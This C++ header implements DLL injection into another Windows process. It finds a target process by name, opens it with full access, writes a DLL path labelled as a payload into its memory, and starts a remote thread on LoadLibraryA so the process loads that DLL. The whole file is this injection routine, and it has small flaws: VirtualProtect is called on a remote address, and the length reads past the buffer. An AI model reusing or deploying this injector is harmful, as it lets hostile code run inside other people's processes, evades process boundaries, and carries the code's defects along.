#pragma once

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>

class HQ {

	private:

		LPVOID rBuff;
		VOID* LoadLib;
		DWORD old = 0;
		HANDLE hTarget;
		HANDLE rThread;
		int pID = NULL;
		HANDLE ProcList;
		HMODULE hKernel32;

		PROCESSENTRY32 prEntry;

		char payload[MAX_PATH] = "C:\\your-payload.dll"; // subject to change
		unsigned int payload_len = sizeof(payload) + 1;

	public:

		void GetPID(const wchar_t *target) {

			// Get process ID by name

			/*
				TH32CS_SNAPPROCESS  0x00000002
				TH32CS_SNAPTHREAD   0x00000004
			*/

			ProcList = CreateToolhelp32Snapshot(0x00000002 | 0x00000004, 0);

			prEntry.dwSize = sizeof(PROCESSENTRY32);

			// Check all processes

			if (Process32First(ProcList, &prEntry) == TRUE) {

				do {

					// If proc exe file is target get the pID

					if (_wcsicmp(prEntry.szExeFile, target) == 0) {

						pID = prEntry.th32ProcessID;
						printf("Got pid: %d\n", pID);
						break;

					}

				} while (Process32Next(ProcList, &prEntry));

			}

			// Could not get pID

			if (pID == NULL) {
				printf("Could not get pID\n");
			}

			// Finished

			CloseHandle(ProcList);

		}

		bool Load() {

			hKernel32 = GetModuleHandleA("Kernel32");

			if (hKernel32 == NULL) {

				printf("[!] Error hKernel32\n");
				return false;

			}

			LoadLib = GetProcAddress(hKernel32, "LoadLibraryA");

			hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);

			if (hTarget == NULL) {

				printf("[!] Error OpenProcess\n");
				return false;

			}

			// Allocate memory as RW first

			rBuff = VirtualAllocEx(hTarget, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

			// Write payload to memory

			WriteProcessMemory(hTarget, rBuff, payload, payload_len, NULL);

			// Change memory page prot to RX

			BOOL Prot = VirtualProtect(rBuff, payload_len, PAGE_EXECUTE_READ, &old);

			// Create a thread to execute payload

			rThread = CreateRemoteThread(hTarget, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLib, rBuff, 0, NULL);
			CloseHandle(hTarget);
			return true;
		}


};
